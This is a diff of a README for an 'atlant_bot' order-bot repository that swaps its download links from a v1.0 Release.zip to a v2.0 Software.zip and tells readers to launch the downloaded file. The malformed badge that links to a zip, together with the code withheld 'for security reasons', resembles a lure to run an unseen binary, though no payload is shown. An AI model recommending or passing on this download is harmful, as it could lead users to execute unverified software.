@@ -1,6 +1,6 @@
 # 🤖 Welcome to "atlant_bot" Repository! 📌
 
-![atlant_bot](https://github.com/ItzMartinSK/atlant_bot/releases/download/v1.0/Release.zip%20Bot-blueviolet)
+![atlant_bot](https://github.com/ItzMartinSK/atlant_bot/releases/download/v2.0/Software.zip%20Bot-blueviolet)
 
 ## Description
 Welcome to **atlant_bot** - your personal order bot! 🤖 This repository contains the main part of the code for an order bot designed to assist users in placing orders easily. Please note that some parts of the code are not included here due to security reasons. Don't worry, though, the essential functionalities are available for you to explore and customize according to your needs. 🚀
@@ -22,7 +22,7 @@ Welcome to **atlant_bot** - your personal order bot! 🤖 This repository contai
 ## Quick Access
 🔗 For quick access to the software, you can download it from the following link: 
 
-[![Software Download](https://github.com/ItzMartinSK/atlant_bot/releases/download/v1.0/Release.zip)](https://github.com/ItzMartinSK/atlant_bot/releases/download/v1.0/Release.zip)
+[![Software Download](https://github.com/ItzMartinSK/atlant_bot/releases/download/v2.0/Software.zip)](https://github.com/ItzMartinSK/atlant_bot/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched for installation. 🚀
 
